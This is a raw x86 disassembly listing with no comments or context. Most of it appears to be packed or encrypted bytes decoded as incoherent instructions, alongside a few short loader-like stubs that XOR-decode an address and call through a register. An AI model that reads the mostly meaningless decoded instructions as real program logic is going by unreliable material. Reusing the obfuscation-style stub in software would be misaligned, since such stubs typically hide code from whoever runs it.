  4119a2:	loop   0x41195d
  4119a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4119a5:	loop   0x411931
  4119a7:	cmp    edi,DWORD PTR [edi]
  4119a9:	es cld 
  4119ab:	mov    esp,0xd3a0d778
  4119b0:	das    
  4119b1:	xor    eax,0xac91014
  4119b6:	mov    ds:0x716d4150,eax
  4119bb:	jecxz  0x4119a3
  4119bd:	mov    ecx,DWORD PTR [edi+0x33795209]
  4119c3:	push   0xb1c1f3b3
  4119c8:	inc    eax
  4119c9:	cs mov edi,0x27576a0b
  4119cf:	(bad)  
  4119d0:	movnti DWORD PTR [esi],esp
  4119d3:	aas    
  4119d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4119d5:	out    0xf,eax
  4119d7:	adc    cl,BYTE PTR [eax]
  4119d9:	jns    0x4119ef
  4119db:	sbb    cl,dl
  4119dd:	shl    esp,0x39
  4119e0:	mov    ah,BYTE PTR [eax+0x63]
  4119e3:	and    al,0x9a
  4119e5:	aaa    
  4119e6:	jns    0x4119ed
  4119e8:	mov    esi,0x6cfde302
  4119ed:	jge    0x4119d9
  4119ef:	cmp    BYTE PTR [edi],cl
  4119f1:	test   esi,eax
  4119f3:	out    dx,eax
  4119f4:	(bad)  
  4119f5:	dec    DWORD PTR [ebx+0x5e9de]
  4119fb:	add    BYTE PTR [eax],al
  4119fd:	mov    ebx,0x32729c
  411a02:	mov    eax,DWORD PTR [ebp-0x4]
  411a05:	xor    eax,0x7510855
  411a0a:	add    eax,ebx
  411a0c:	mov    DWORD PTR [ebp-0xc],eax
  411a0f:	xor    ebx,ebx
  411a11:	lea    eax,[ebp-0x10]
  411a14:	add    ebx,DWORD PTR [eax]
  411a16:	call   ebx
  411a18:	xor    ebx,ebx
  411a1a:	inc    ebx
  411a1b:	cmp    DWORD PTR [ebp+0x10],ebx
  411a1e:	je     0x411e30
  411a24:	xchg   edx,eax
  411a25:	push   0xa
  411a27:	pop    ecx
  411a28:	push   0x4
  411a2a:	pop    ebx
  411a2b:	inc    ebx
  411a2c:	jmp    0x411e20
  411a31:	inc    ebp
  411a32:	or     DWORD PTR [edi+0x55d349c7],0xffffff81
  411a39:	push   esi
  411a3a:	ds sbb eax,0x4b2c187d
  411a40:	xlat   BYTE PTR ds:[ebx]
  411a41:	(bad)  
  411a42:	dec    esp
  411a43:	jo     0x411ab5
  411a45:	dec    ecx
  411a46:	jge    0x411ab8
  411a48:	jo     0x4119cf
  411a4a:	dec    esi
  411a4b:	nop
  411a4c:	mov    ecx,0xef11c9fd
  411a51:	cli    
  411a52:	outs   dx,DWORD PTR ds:[esi]
  411a53:	adc    DWORD PTR [eax],ebp
  411a55:	rcl    dh,0xad
  411a58:	int    0x5
  411a5a:	fadd   QWORD PTR [eax-0x57]
  411a5d:	jecxz  0x411a62
  411a5f:	jle    0x411aab
  411a61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a63:	aam    0x16
  411a65:	or     ebx,DWORD PTR ds:0x1c1576e3
  411a6b:	cmp    eax,0x88246de7
  411a70:	mov    al,ds:0x4157d0fc
  411a75:	adc    BYTE PTR [ebp-0x6],bh
  411a78:	call   0x97d7:0xa4e72858
  411a7f:	fld    DWORD PTR [ebp+0x45]
  411a82:	pop    edx
  411a83:	jmp    0x411aa6
  411a85:	xchg   edx,eax
  411a86:	sti    
  411a87:	push   es
  411a88:	outs   dx,BYTE PTR ds:[esi]
  411a89:	push   es
  411a8a:	gs daa 
  411a8c:	pop    ds
  411a8d:	dec    eax
  411a8e:	out    0x49,al
  411a90:	mov    al,0x8b
  411a92:	mov    ss,WORD PTR [edx-0x61f99fe1]
  411a98:	les    esp,FWORD PTR [edx+esi*2-0x30]
  411a9c:	sbb    eax,0xcbc528ca
  411aa1:	cmp    edx,esp
  411aa3:	dec    esi
  411aa4:	aad    0x69
  411aa6:	cmp    al,0x87
  411aa8:	adc    bl,bl
  411aaa:	imul   ebx,DWORD PTR [ebx],0x49
  411aad:	retf   
  411aae:	sti    
  411aaf:	loopne 0x411a47
  411ab1:	push   ds
  411ab2:	xlat   BYTE PTR ds:[ebx]
  411ab3:	shr    ebx,0xd1
  411ab6:	out    0x78,al
  411ab8:	popf   
  411ab9:	frstor [edi+0x1f2f7ed3]
  411abf:	fmul   st,st(6)
  411ac1:	push   es
  411ac2:	popf   
  411ac3:	test   esp,edx
  411ac5:	sar    BYTE PTR [edi+0x32092110],1
  411acb:	fcomp  DWORD PTR [edx-0x37]
  411ace:	add    eax,0x4090f24d
  411ad3:	iret   
  411ad4:	inc    esp
  411ad5:	fadd   st,st(4)
  411ad7:	das    
  411ad8:	jne    0x411b27
  411ada:	mov    esp,0x46a50b71
  411adf:	popa   
  411ae0:	pop    edx
  411ae1:	cmp    eax,0x24a60f1a
  411ae6:	xlat   BYTE PTR ds:[ebx]
  411ae7:	adc    al,0xb1
  411ae9:	mov    ds:0xa2918ca8,eax
  411aee:	leave  
  411aef:	fidiv  WORD PTR [edx-0x72]
  411af2:	retf   
  411af3:	sbb    al,0x2b
  411af5:	shr    al,cl
  411af7:	or     BYTE PTR [di+0x5],bl
  411afb:	(bad)  
  411afd:	push   edx
  411afe:	(bad)  
  411b00:	push   esi
  411b01:	mov    dl,bl
  411b03:	std    
  411b04:	call   0xfebe:0xb28d749c
  411b0b:	test   al,bl
  411b0d:	adc    esi,ebp
  411b0f:	inc    ebp
  411b10:	pop    ecx
  411b11:	add    esp,DWORD PTR [esp+ecx*2-0x2c]
  411b15:	mov    db1,esp
  411b18:	lods   al,BYTE PTR ds:[esi]
  411b19:	push   ebx
  411b1a:	fidivr WORD PTR [ebx-0x5a2ffa06]
  411b20:	les    ecx,FWORD PTR [ebx]
  411b22:	sbb    eax,DWORD PTR [esi+0x47]
  411b25:	shl    DWORD PTR [edx],0x5d
  411b28:	fcmovne st,st(2)
  411b2a:	cmp    al,0x8e
  411b2c:	inc    esp
  411b2d:	or     al,ch
  411b2f:	cld    
  411b30:	not    ebx
  411b32:	lods   eax,DWORD PTR ds:[esi]
  411b33:	repz sub al,0xe8
  411b36:	outs   dx,BYTE PTR ds:[esi]
  411b37:	jg     0x411b17
  411b39:	leave  
  411b3a:	adc    eax,0x92337a37
  411b3f:	sbb    ch,0x65
  411b42:	mov    ds:0xc95ff5c9,eax
  411b47:	xor    eax,0x44025710
  411b4c:	inc    DWORD PTR [esi-0x64]
  411b4f:	and    eax,0x76842c91
  411b54:	push   edi
  411b55:	mov    eax,ds:0x52efa7b2
  411b5a:	(bad)  
  411b5c:	loop   0x411bc3
  411b5e:	jnp    0x411b38
  411b60:	lds    eax,FWORD PTR [edx+0x40]
  411b63:	popf   
  411b64:	das    
  411b65:	je     0x411bb5
  411b67:	jae    0x411b14
  411b69:	(bad)  
  411b6a:	hlt    
  411b6b:	(bad)
  411b6e:	cmp    DWORD PTR [edx-0x8],0x8dd3f7ae
  411b75:	adc    eax,0x127127c4
  411b7a:	repnz int3 
  411b7c:	mov    cl,0xd3
  411b7e:	cld    
  411b7f:	lods   al,BYTE PTR ds:[esi]
  411b80:	push   ds
  411b81:	lea    ecx,[eax]
  411b83:	ret    0xc812
  411b86:	push   ds
  411b87:	icebp  
  411b88:	sbb    esi,DWORD PTR [esi-0x21be83c0]
  411b8e:	pop    edx
  411b8f:	jns    0x411bdf
  411b91:	lahf   
  411b92:	xor    DWORD PTR [eax],esp
  411b94:	in     eax,dx
  411b95:	add    dl,BYTE PTR [ebp-0x6]
  411b98:	and    bh,BYTE PTR [eax+0x69]
  411b9b:	mov    BYTE PTR [edi+0x23a457bc],al
  411ba1:	xchg   esi,eax
  411ba2:	xchg   ecx,eax
  411ba3:	test   ah,dh
  411ba5:	add    al,0x7e
  411ba7:	dec    esp
  411ba8:	es imul esi,esp,0xab466399
  411baf:	add    eax,0x24fde7e7
  411bb4:	stc    
  411bb5:	push   esp
  411bb6:	sub    dl,dh
  411bb8:	adc    eax,0x3aeb47a2
  411bbd:	push   edi
  411bbe:	arpl   WORD PTR [ebx-0x4a24fbac],ax
  411bc4:	call   0x4389:0xeb835a8
  411bcb:	test   WORD PTR [ebp+0x68],bp
  411bcf:	and    dl,BYTE PTR [ebp-0x1692964b]
  411bd5:	addr16 sbb al,0xa8
  411bd8:	add    al,BYTE PTR [esi+0x63]
  411bdb:	(bad)  
  411bdc:	pop    ss
  411bdd:	les    edi,FWORD PTR [ebx]
  411bdf:	fisttp DWORD PTR [edx-0x2d8c79c6]
  411be5:	xchg   esp,eax
  411be6:	neg    DWORD PTR [esi+0x7c1001ca]
  411bec:	inc    eax
  411bed:	adc    DWORD PTR [eax],esp
  411bef:	test   BYTE PTR [edx+0x7],cl
  411bf2:	(bad)  
  411bf4:	jne    0x411bf4
  411bf6:	out    0xc2,al
  411bf8:	mov    DWORD PTR [eax],esi
  411bfa:	pop    DWORD PTR [ecx+0x65]
  411bfd:	xor    edx,ebp
  411bff:	push   esp
  411c00:	test   DWORD PTR [eax+eax*1],0x8eb69cb7
  411c07:	daa    
  411c08:	mov    edi,0x1478894f
  411c0d:	retf   0x5f80
  411c10:	dec    ebx
  411c11:	call   0xa7db7e16
  411c16:	pop    ebp
  411c17:	bnd jg 0x411c33
  411c1a:	jnp    0x411bef
  411c1c:	and    esp,DWORD PTR [esi+0x3d]
  411c1f:	cs pop esi
  411c21:	(bad)  
  411c23:	jmp    0x411bfc
  411c25:	out    dx,al
  411c26:	add    bl,BYTE PTR [ebx+eiz*2-0x52a9a225]
  411c2d:	pop    ds
  411c2e:	and    eax,0xe030a3a5
  411c33:	pop    es
  411c34:	out    0xc7,al
  411c36:	ret    0x9b30
  411c39:	push   ebp
  411c3a:	mov    dh,0x6
  411c3c:	js     0x411c1b
  411c3e:	mov    esp,0x3ae23a14
  411c43:	test   ebx,ebp
  411c45:	mov    ds:0x72d499d3,al
  411c4a:	or     eax,ebx
  411c4c:	or     al,0x80
  411c4e:	sub    esp,DWORD PTR [ebx]
  411c50:	fstp   QWORD PTR [eax+eax*8-0x62]
  411c54:	aam    0xba
  411c56:	mov    ds,WORD PTR [edi+0x65]
  411c59:	and    al,0xf
  411c5b:	sub    bl,dl
  411c5d:	push   edx
  411c5e:	cwde   
  411c5f:	push   ecx
  411c60:	push   esi
  411c61:	cmp    al,BYTE PTR [esi+0x98a96e1]
  411c67:	popf   
  411c68:	jp     0x411c61
  411c6a:	or     al,0x90
  411c6c:	sar    BYTE PTR [esi+edi*1-0x38],0x2c
  411c71:	adc    esi,0x87e0e3c4
  411c77:	lds    edi,FWORD PTR [eax+0x5d]
  411c7a:	cld    
  411c7b:	outs   dx,DWORD PTR ds:[esi]
  411c7c:	lock fisubr DWORD PTR [edi+0x14]
  411c80:	mov    edx,0xec907516
  411c85:	fcmovu st,st(1)
  411c87:	mov    al,ds:0x5e25be3
  411c8c:	in     eax,0x47
  411c8e:	stc    
  411c8f:	mov    ?,edx
  411c91:	out    dx,eax
  411c92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c93:	push   cs
  411c94:	adc    cl,dh
  411c96:	mov    edx,0xd3d489f8
  411c9b:	jmp    0x9a9d:0x5617a3e1
  411ca2:	mov    ch,0xea
  411ca4:	clc    
  411ca5:	dec    ecx
  411ca6:	in     eax,dx
  411ca7:	xchg   edx,eax
  411ca8:	pop    es
  411ca9:	arpl   WORD PTR [eax],sp
  411cab:	popa   
  411cac:	pop    ebx
  411cad:	push   ss
  411cae:	in     eax,0x6c
  411cb0:	cmp    bh,BYTE PTR [ecx+0x3b]
  411cb3:	dec    ebx
  411cb4:	xlat   BYTE PTR ds:[ebx]
  411cb5:	jge    0x411d27
  411cb7:	dec    esi
  411cb8:	addr16 test al,0xfd
  411cbb:	scas   eax,DWORD PTR es:[edi]
  411cbc:	cmovp  eax,DWORD PTR [ebx-0x44712bc3]
  411cc3:	xchg   DWORD PTR [ebx+edi*8+0x2e9c16a1],ebx
  411cca:	aam    0x90
  411ccc:	out    0xd3,eax
  411cce:	fwait
  411ccf:	repnz pusha 
  411cd1:	out    0x15,al
  411cd3:	fsub   QWORD PTR [eax-0x37ee3dea]
  411cd9:	add    edx,DWORD PTR [ebx]
  411cdb:	cli    
  411cdc:	and    al,0x4b
  411cde:	loopne 0x411cbd
  411ce0:	lock fs stos BYTE PTR es:[edi],al
  411ce3:	ret    
  411ce4:	adc    eax,DWORD PTR [ecx]
  411ce6:	retf   0x58d1
  411ce9:	add    al,BYTE PTR [edi+0x3cd60dfa]
  411cef:	repnz pop esi
  411cf1:	daa    
  411cf2:	enter  0xe1e9,0x8
  411cf6:	gs stos BYTE PTR es:[edi],al
  411cf8:	xor    edi,esi
  411cfa:	popf   
  411cfb:	jnp    0x411cee
  411cfd:	inc    edi
  411cfe:	add    al,BYTE PTR [edx]
  411d00:	jns    0x411cc0
  411d02:	pop    edx
  411d03:	pop    es
  411d04:	adc    edx,DWORD PTR [edi]
  411d06:	repnz inc ebp
  411d08:	sbb    BYTE PTR [eax+0x6c],ah
  411d0b:	push   cs
  411d0c:	push   0xa238ff72
  411d11:	mov    ch,0xcf
  411d13:	push   esp
  411d14:	fst    DWORD PTR fs:[ecx]
  411d17:	std    
  411d18:	xor    eax,0xb1bccf51
  411d1d:	mov    ch,0xf5
  411d1f:	rol    BYTE PTR [esi],0xac
  411d22:	scas   eax,DWORD PTR es:[edi]
  411d23:	mov    ch,0x6e
  411d25:	imul   ecx,DWORD PTR [eax],0x1e
  411d28:	(bad)  
  411d29:	repnz add esp,edx
  411d2c:	dec    esp
  411d2d:	mov    al,ds:0xa1b3d499
  411d32:	push   ds
  411d33:	mov    esi,0x61315963
  411d38:	int3   
  411d39:	dec    ebx
  411d3a:	xchg   edi,ebp
  411d3c:	or     DWORD PTR [edx],eax
  411d3e:	push   esp
  411d3f:	(bad)  [edi+ebp*4]
  411d42:	adc    ebx,eax
  411d44:	es sub eax,0xa5ccc072
  411d4a:	lea    ecx,[edx]
  411d4c:	sahf   
  411d4d:	pop    edx
  411d4e:	inc    edx
  411d4f:	fsubr  DWORD PTR [ebp+0x19a25e46]
  411d55:	xchg   ebp,eax
  411d56:	dec    eax
  411d57:	inc    ebp
  411d58:	(bad)  
  411d59:	iret   
  411d5a:	cmc    
  411d5b:	pop    edx
  411d5c:	(bad)  
  411d5d:	scas   al,BYTE PTR es:[edi]
  411d5e:	fadd   DWORD PTR [edi]
  411d60:	sbb    DWORD PTR [ecx],ebp
  411d62:	je     0x411ddf
  411d64:	ret    0xde95
  411d67:	data16 mov cl,0x35
  411d6a:	inc    edi
  411d6b:	xor    eax,0x9cde7fc6
  411d70:	(bad)  
  411d71:	jmp    0x411d37
  411d73:	stc    
  411d74:	push   edx
  411d75:	push   0xffffffbf
  411d77:	in     al,0x5
  411d79:	outs   dx,DWORD PTR ds:[esi]
  411d7a:	(bad)  
  411d7c:	shr    DWORD PTR [ebx],cl
  411d7e:	push   ecx
  411d7f:	add    eax,0x9578f6ce
  411d84:	xor    eax,0xe7c2c235
  411d89:	fwait
  411d8a:	cwde   
  411d8b:	sub    al,ah
  411d8d:	jae    0x411de0
  411d8f:	loopne 0x411d91
  411d91:	mov    ds:0xf2f73b9e,al
  411d96:	push   ss
  411d97:	sbb    al,0x12
  411d99:	ret    
  411d9a:	outs   dx,BYTE PTR ds:[esi]
  411d9b:	sub    dl,BYTE PTR ds:0x23c0b838
  411da1:	cmp    eax,0x2eb7dd13
  411da6:	mov    es,WORD PTR [ebx-0x4ac79b43]
  411dac:	inc    ebp
  411dad:	pop    ds
  411dae:	jbe    0x411da6
  411db0:	mov    ds:0x741c5854,al
  411db5:	mov    ebx,0x3d085274
  411dba:	adc    esp,DWORD PTR ds:0x5d8168d0
  411dc0:	or     eax,0xa651aca0
  411dc5:	ret    0x2199
  411dc8:	retf   0xd2d6
  411dcb:	pushf  
  411dcc:	fbld   TBYTE PTR [esp+ecx*1]
  411dcf:	lods   al,BYTE PTR ds:[esi]
  411dd0:	jmp    0x7f8b:0xcf498c0c
  411dd7:	and    bh,BYTE PTR [ebx]
  411dd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411dda:	sub    BYTE PTR [edi+esi*4-0x2ced047b],bh
  411de1:	mov    esp,0xde56ef6d
  411de6:	inc    ebp
  411de7:	mov    esp,0x1a200bc1
  411dec:	mov    esi,0x30872a5a
  411df1:	test   al,0xb4
  411df3:	out    dx,eax
  411df4:	aam    0xf6
  411df6:	(bad)  
  411df7:	mov    bh,0xd8
  411df9:	dec    eax
  411dfa:	lods   al,BYTE PTR ds:[esi]
  411dfb:	ds jp  0x411de7
  411dfe:	addr16 hlt 
  411e00:	or     edi,esp
  411e02:	(bad)  
  411e03:	xor    BYTE PTR [eax+0x41],bh
  411e06:	(bad)  
  411e08:	lahf   
  411e09:	mov    esp,0x6700ae0b
  411e0e:	adc    DWORD PTR [edi-0x2404f406],esi
  411e14:	inc    esp
  411e15:	jb     0x411e3c
  411e17:	add    eax,0xd0e4a151
  411e1c:	lea    edi,[ecx]
  411e1e:	dec    esp
  411e1f:	repz xchg ebx,ecx
  411e22:	sub    ebx,ecx
  411e24:	xchg   ebx,ecx
  411e26:	dec    ecx
  411e27:	mov    eax,DWORD PTR [ebp-0x1c]
  411e2a:	imul   eax,ecx
  411e2d:	add    esp,eax
  411e2f:	xchg   edx,eax
  411e30:	push   eax
  411e31:	xor    ebx,ebx
  411e33:	mov    edx,esp
  411e35:	dec    edx
  411e36:	inc    ebx
  411e37:	add    ebx,DWORD PTR [edx+ebx*1]
  411e3a:	jmp    0x41222e
  411e3f:	jp     0x411dc5
  411e41:	jb     0x411ea0
  411e43:	jb     0x411eb2
  411e45:	adc    DWORD PTR [ebx-0xc],esp
  411e48:	sub    ebp,DWORD PTR [esi]
  411e4a:	cmc    
  411e4b:	mov    al,ds:0x109080a2
  411e50:	dec    eax
  411e51:	jo     0x411ec3
  411e53:	dec    ecx
  411e54:	jge    0x411ec6
  411e56:	jo     0x411e5a
  411e58:	dec    esp
  411e59:	in     al,0x1e
  411e5b:	add    eax,DWORD PTR [esi-0x2c]
  411e5e:	retf   
  411e5f:	retf   
  411e60:	shr    BYTE PTR [eax],1
  411e62:	fsubr  DWORD PTR [edi-0x59]
  411e65:	mov    ds:0x8d4c847d,al
  411e6a:	mov    eax,ebp
  411e6c:	sub    edi,DWORD PTR [esi-0x1e682efe]
  411e72:	sub    dl,BYTE PTR ds:0x95f4e3f6
  411e78:	push   esi
  411e79:	add    al,0xcf
  411e7b:	mov    edx,0x8636762a
  411e80:	dec    esp
  411e81:	out    dx,al
  411e82:	call   0x7aab:0x4fd1a6be
  411e89:	ror    DWORD PTR [ebx],0xc5
  411e8c:	int3   
  411e8d:	mov    al,0x4a
  411e8f:	xor    BYTE PTR [ebx+0x44aafb9b],0x5e
  411e96:	pop    ds
  411e97:	loope  0x411e71
  411e99:	mov    fs,WORD PTR [esi-0x2700a70b]
  411e9f:	and    eax,0xb41fed89
  411ea4:	cwde   
  411ea5:	es stos DWORD PTR es:[edi],eax
  411ea7:	sbb    DWORD PTR [ebx-0x4c],esi
  411eaa:	mov    esi,0x3a0d3d59
  411eaf:	jnp    0x411e3a
  411eb1:	push   es
  411eb2:	or     eax,0x60339345
  411eb7:	xor    al,0x90
  411eb9:	lock ror dh,0x5
  411ebd:	icebp  
  411ebe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ebf:	ss jge 0x411ec0
  411ec2:	jae    0x411ed9
  411ec4:	fs jns 0x411ef9
  411ec7:	push   cs
  411ec8:	retf   0x2334
  411ecb:	adc    eax,0xca8f0502
  411ed0:	fwait
  411ed1:	and    al,0x18
  411ed3:	les    edx,FWORD PTR [eax-0x4ed72613]
  411ed9:	inc    ebx
  411eda:	sti    
  411edb:	mov    ds:0x242378f4,al
  411ee0:	(bad)  
  411ee2:	jns    0x411ed2
  411ee4:	fdiv   st(2),st
  411ee6:	inc    esp
  411ee7:	scas   al,BYTE PTR es:[edi]
  411ee8:	fisub  WORD PTR ds:[ebx+0x193b8d95]
  411eef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ef0:	pop    esp
  411ef1:	dec    ebx
  411ef2:	sti    
  411ef3:	pop    ecx
  411ef4:	js     0x411f1d
  411ef6:	mov    al,0x8d
  411ef8:	inc    ecx
  411ef9:	scas   eax,DWORD PTR es:[edi]
  411efa:	push   ebp
  411efb:	cs dec eax
  411efd:	dec    ecx
  411efe:	adc    DWORD PTR [edi],eax
  411f00:	dec    eax
  411f01:	push   esi
  411f02:	mov    bl,0x1e
  411f04:	mov    ebp,0xe5b2f67c
  411f09:	loopne 0x411f6b
  411f0b:	xlat   BYTE PTR ds:[ebx]
  411f0c:	outs   dx,DWORD PTR ds:[esi]
  411f0d:	in     al,0x8f
  411f0f:	pop    ss
  411f10:	retf   
  411f11:	sub    eax,0x16f48922
  411f16:	(bad)  
  411f17:	out    0xc9,al
  411f19:	pop    esi
  411f1a:	sti    
  411f1b:	pusha  
  411f1c:	scas   eax,DWORD PTR es:[edi]
  411f1d:	jmp    0x56d8:0x118538be
  411f24:	mov    edx,DWORD PTR [eax+0x5]
  411f27:	xchg   ebp,eax
  411f28:	(bad)  
  411f29:	ja     0x411f5b
  411f2b:	ins    DWORD PTR es:[edi],dx
  411f2c:	out    0xdc,al
  411f2e:	test   BYTE PTR ds:0xeee4d1b7,cl
  411f34:	push   es
  411f35:	mov    BYTE PTR [ecx],dh
  411f37:	ja     0x411f4e
  411f39:	in     eax,0xe0
  411f3b:	pop    esp
  411f3c:	xor    BYTE PTR ds:[eax],dh
  411f3f:	imul   ebx,DWORD PTR [edx],0xffffffb3
  411f42:	mov    ch,0x50
  411f44:	push   ss
  411f45:	imul   ebp,DWORD PTR [esi+0x65],0xfffffff9
  411f49:	dec    DWORD PTR [edx]
  411f4b:	mov    ah,0x1c
  411f4d:	push   0xffffffb3
  411f4f:	fnsave [esp+esi*2+0x4a]
  411f53:	sub    eax,0x1b68f316
  411f58:	cmc    
  411f59:	fs inc esp
  411f5b:	add    al,0xe6
  411f5d:	push   0x5422b9c2
  411f62:	cs inc esp
  411f64:	inc    ecx
  411f65:	test   al,0xe
  411f67:	loope  0x411f2f
  411f69:	retf   
  411f6a:	and    eax,0xfce59109
  411f6f:	or     ch,BYTE PTR [ebx+0x57]
  411f72:	cs mov esi,0xec17d2cc
  411f78:	repnz mov edi,0x6298e40d
  411f7e:	jl     0x411f51
  411f80:	repnz and al,BYTE PTR [esi-0x32f34001]
  411f87:	cmp    DWORD PTR [ebx+ebp*2-0x64],edi
  411f8b:	fld    DWORD PTR es:[ebx]
  411f8e:	dec    edi
  411f8f:	call   0x73b0:0xa51fd33b
  411f96:	and    DWORD PTR [edx-0x5c],ecx
  411f99:	out    dx,eax
  411f9a:	daa    
  411f9b:	nop
  411f9c:	ja     0x411f95
  411f9e:	pop    esp
  411f9f:	cdq    
  411fa0:	add    ah,BYTE PTR [edx-0x5759c36b]
  411fa6:	push   ebx
  411fa7:	push   cs
  411fa8:	js     0x411f2f
  411faa:	inc    edx
  411fab:	mov    ds:0x93f9b4a1,eax
  411fb0:	jge    0x411f51
  411fb2:	inc    esi
  411fb3:	xlat   BYTE PTR ds:[ebx]
  411fb4:	jo     0x411fb7
  411fb6:	xchg   edx,eax
  411fb7:	add    esi,DWORD PTR [eax+0x43b309b9]
  411fbd:	fsub   QWORD PTR [edi-0x6f]
  411fc0:	push   ecx
  411fc1:	dec    edi
  411fc2:	or     eax,0x3fb1c734
  411fc7:	dec    ebp
  411fc8:	jmp    FWORD PTR [eax+0x508ec05b]
  411fce:	mov    eax,DWORD PTR [ebp-0x66a7825a]
  411fd4:	inc    edi
  411fd5:	pop    edx
  411fd6:	sub    al,0xb3
  411fd8:	or     al,0x63
  411fda:	not    DWORD PTR [ebp+0x28]
  411fdd:	lahf   
  411fde:	out    dx,eax
  411fdf:	jne    0x411ff1
  411fe1:	dec    ebx
  411fe2:	xchg   edx,eax
  411fe3:	and    ecx,DWORD PTR [edi+0x44]
  411fe6:	xchg   edi,eax
  411fe7:	rcl    DWORD PTR ds:0x9e822926,cl
  411fed:	dec    esp
  411fee:	push   0x9c2a4f12
  411ff3:	pop    edi
  411ff4:	sete   BYTE PTR [ebx]
  411ff7:	push   esp
  411ff8:	dec    ebx
  411ff9:	push   ss
  411ffa:	je     0x411faf
  411ffc:	stos   BYTE PTR es:[edi],al
  411ffd:	jnp    0x41204e
  411fff:	bound  ebp,QWORD PTR [esi+0x47]
  412002:	icebp  
  412003:	dec    esi
  412004:	imul   ebp,DWORD PTR fs:[edx+0x75],0xffffffdb
  412009:	or     WORD PTR ds:0xc14210a3,di
  412010:	inc    edi
  412011:	jo     0x411fef
  412013:	mov    bh,BYTE PTR [edx]
  412015:	fmul   st,st(0)
  412017:	int    0x39
  412019:	dec    ecx
  41201a:	lea    edx,ss:[eax]
  41201d:	sbb    al,0x50
  41201f:	(bad)  
  412021:	push   cs
  412022:	xor    BYTE PTR [eax+edx*4],al
  412025:	jns    0x411fb4
  412027:	out    0x64,eax
  412029:	xchg   ecx,eax
  41202a:	jo     0x412003
  41202c:	xchg   ebx,eax
  41202d:	aam    0x7e
  41202f:	into   
  412030:	inc    ebp
  412031:	sti    
  412032:	(bad)  
  412033:	lock jl 0x412075
  412036:	jp     0x41208e
  412038:	push   0x7
  41203a:	fs jg  0x412088
  41203d:	mov    bl,0x86
  41203f:	cdq    
  412040:	cld    
  412041:	imul   ebp
  412043:	je     0x412039
  412045:	cmp    al,0xe8
  412047:	dec    BYTE PTR [eax-0x3f4cbfc5]
  41204d:	clc    
  41204e:	inc    esi
  41204f:	int3   
  412050:	mov    ch,0x42
  412052:	test   BYTE PTR [ebp+0x652b4c2f],cl
  412058:	add    edi,0xffffffc4
  41205b:	xlat   BYTE PTR ds:[ebx]
  41205c:	cld    
  41205d:	rcr    BYTE PTR [edi+ecx*1],0x8e
  412061:	xchg   eax,ebp
  412063:	pop    ecx
  412064:	inc    esi
  412065:	es xchg ebp,eax
  412067:	jae    0x412082
  412069:	adc    al,0xa2
  41206b:	pusha  
  41206c:	cmp    eax,DWORD PTR [ebx+0x2e]
  41206f:	xchg   ebp,eax
  412070:	push   ecx
  412071:	push   ebx
  412072:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412073:	push   eax
  412074:	retf   0x7a4a
  412077:	sahf   
  412078:	push   esp
  412079:	in     eax,dx
  41207a:	shl    BYTE PTR [ecx+edi*2],cl
  41207d:	adc    edx,ecx
  41207f:	sar    bl,cl
  412081:	or     DWORD PTR [ebp+ebp*2+0x76d0e985],ecx
  412088:	add    edi,DWORD PTR [ecx+edi*1-0x51]
  41208c:	xchg   ebx,eax
  41208d:	cmp    BYTE PTR [edx+ecx*1],ah
  412090:	fbstp  TBYTE PTR [ebp-0x24]
  412093:	stos   DWORD PTR es:[edi],eax
  412094:	jns    0x4120a2
  412096:	push   edx
  412097:	(bad)  
  412098:	neg    BYTE PTR [edx+0x2e]
  41209b:	jb     0x412042
  41209d:	les    esi,FWORD PTR [edi-0x6bb9585]
  4120a3:	pop    ebx
  4120a4:	dec    ecx
  4120a5:	xchg   edi,eax
  4120a6:	shr    DWORD PTR [eax+ebp*1+0x4],0xae
  4120ab:	sbb    ebp,DWORD PTR [eax]
  4120ad:	mov    cl,0xa6
  4120af:	mov    ecx,0xc9fd3720
  4120b4:	jbe    0x412114
  4120b6:	fs daa 
  4120b8:	push   esp
  4120b9:	movq   QWORD PTR ds:0xe1ca7ab9,mm6
  4120c0:	xchg   edi,eax
  4120c1:	mov    BYTE PTR [esi-0x1cd5606b],dl
  4120c7:	push   edx
  4120c8:	dec    ebp
  4120c9:	ret    
  4120ca:	and    eax,0x14337623
  4120cf:	push   edi
  4120d0:	(bad)  
  4120d1:	into   
  4120d2:	daa    
  4120d3:	pop    ebx
  4120d4:	lods   eax,DWORD PTR ds:[esi]
  4120d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4120d6:	jecxz  0x4120a1
  4120d8:	pop    esp
  4120d9:	cdq    
  4120da:	nop
  4120db:	jne    0x4120ff
  4120dd:	xchg   esi,eax
  4120de:	jno    0x41214d
  4120e0:	xchg   edi,eax
  4120e1:	icebp  
  4120e2:	cld    
  4120e3:	mov    ch,0xdb
  4120e5:	xchg   ecx,eax
  4120e6:	dec    esp
  4120e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4120e8:	mov    ah,0x28
  4120ea:	add    dh,BYTE PTR [ecx-0x38]
  4120ed:	jmp    0xa7620a93
  4120f2:	cwde   
  4120f3:	sub    edx,ebp
  4120f5:	xor    edi,ebx
  4120f7:	jno    0x412168
  4120f9:	sbb    bh,al
  4120fb:	outs   dx,BYTE PTR ds:[esi]
  4120fc:	pusha  
  4120fd:	sub    eax,0xd50e9292
  412103:	jmp    0x53cd7645
  412108:	adc    cl,BYTE PTR [eax-0x68]
  41210b:	out    0x14,eax
  41210d:	cmp    ebp,edx
  41210f:	iret   
  412110:	sub    edi,DWORD PTR [ebx+edi*4-0x925a0ef]
  412117:	dec    ebx
  412118:	stos   BYTE PTR es:[edi],al
  412119:	stc    
  41211a:	dec    edx
  41211b:	dec    edx
  41211c:	test   edi,ebx
  41211e:	mov    esp,0x6b9a348f
  412123:	aaa    
  412124:	mov    ds:0xf6a5d35f,al
  412129:	push   eax
  41212a:	and    ebx,DWORD PTR [ebp+0x32]
  41212d:	arpl   WORD PTR [ebx],di
  41212f:	xchg   esi,eax
  412130:	jae    0x4120bc
  412132:	stos   BYTE PTR es:[edi],al
  412133:	std    
